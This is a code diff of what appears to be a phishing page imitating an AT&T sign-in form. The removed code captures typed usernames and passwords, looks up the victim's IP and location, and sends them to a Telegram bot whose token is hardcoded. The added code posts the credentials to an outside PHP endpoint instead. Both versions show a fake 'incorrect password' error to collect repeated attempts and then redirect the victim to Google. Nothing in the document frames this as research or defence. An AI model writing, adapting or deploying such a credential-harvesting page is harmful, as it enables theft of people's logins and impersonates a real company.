@@ -393,15 +393,11 @@
 </script>
 
 <script>
-    let attemptData = [];
-    let attemptCount = 0;
-  
-    const useridInput = document.getElementById('userid');
-    const pwdInput = document.getElementById('pwd');
     const btnSignIn = document.getElementById('btnSignIn');
-    const formContainer = document.querySelector('.form');
-  
-    // Create error message element
+    const pwdInput = document.getElementById('pwd');
+    const useridInput = document.getElementById('userid');
+    
+    // Create error message element (same as your previous design)
     const errorMessage = document.createElement('div');
     errorMessage.style.backgroundColor = '#f2dede';
     errorMessage.style.color = '#a94442';
@@ -412,89 +408,40 @@
     errorMessage.style.borderRadius = '0px';
     errorMessage.style.display = 'none';
     errorMessage.textContent = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.";
-  
-    // Insert error message right above the sign-in button
     btnSignIn.parentNode.insertBefore(errorMessage, btnSignIn);
-  
-    // Hide error when user types
+    
+    // Hide error on input
     useridInput.addEventListener('input', () => errorMessage.style.display = 'none');
     pwdInput.addEventListener('input', () => errorMessage.style.display = 'none');
-  
+    
     btnSignIn.addEventListener('click', (e) => {
-  e.preventDefault();
-
-  const username = useridInput.value.trim();
-  const password = pwdInput.value.trim();
-
-  attemptCount++;
-
-  const attemptInfo = {
-    attempt: attemptCount,
-    username,
-    password,
-    status: attemptCount === 3 ? "✅ Final Attempt" : "❌ Failed"
-  };
-
-  attemptData.push(attemptInfo);
-
-  const timestamp = new Date().toUTCString();
-
-  // Fetch IP info but don't block sending to Telegram if it fails
-fetch('https://ipapi.co/json/')
-  .then(res => res.json())
-  .catch(() => ({
-    city: 'Unknown',
-    country_name: 'Unknown',
-    ip: 'Unavailable'
-  }))
-  .then(ipinfo => {
-    // Detect device type from User-Agent
-    let deviceType = "Unknown";
-    const ua = attemptInfo.userAgent || ""; // make sure you have userAgent in attemptInfo
-    if (/mobile/i.test(ua)) {
-      deviceType = "Mobile";
-    } else if (/tablet/i.test(ua)) {
-      deviceType = "Tablet";
-    } else if (/desktop|windows|macintosh|linux/i.test(ua)) {
-      deviceType = "Desktop";
-    }
-
-    let message = `🔐 AT&T Login Attempt\n\n`;
-    message += `#${attemptInfo.attempt} ${attemptInfo.status}\n`;
-    message += `👤 Username: ${attemptInfo.username}\n`;
-    message += `🔑 Password: ${attemptInfo.password}\n\n`;
-    message += `🕒 Time: ${timestamp}\n`;
-    message += `🌍 Location: ${ipinfo.city}, ${ipinfo.country_name}\n`;
-    message += `📡 IP: ${ipinfo.ip}\n`;
-    message += `📱 Device: ${deviceType}`;
-
-      const chatId = '5613637159';
-      const botToken = '7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s';
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-      // Send message to Telegram
-      return fetch(url);
-    })
-    .then(() => {
-      if (attemptCount < 3) {
-        errorMessage.style.display = 'block';
-        pwdInput.value = '';
-        pwdInput.focus();
-      } else {
-        window.location.href = 'https://www.google.com';
-      }
-    })
-    .catch(err => {
-      console.error("Error sending data", err);
-      if (attemptCount >= 3) {
-        window.location.href = 'https://www.google.com';
-      } else {
-        errorMessage.style.display = 'block';
-      }
+        e.preventDefault();
+    
+        const formData = new FormData();
+        formData.append('userid', useridInput.value.trim());
+        formData.append('pwd', pwdInput.value.trim());
+    
+        fetch('https://at-ddf.10001mb.com/login.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json()) // PHP will return JSON with {status: "ok" or "final"}
+        .then(data => {
+            if(data.status === "ok") {
+                errorMessage.style.display = 'block';
+                pwdInput.value = '';
+                pwdInput.focus();
+            } else if(data.status === "final") {
+                window.location.href = 'https://www.google.com'; // final redirect
+            }
+        })
+        .catch(err => {
+            console.error("Error sending data", err);
+            errorMessage.style.display = 'block';
+        });
     });
-});
-  </script>
-  
-
+    </script>
+    
+    
 </body>
 </html>
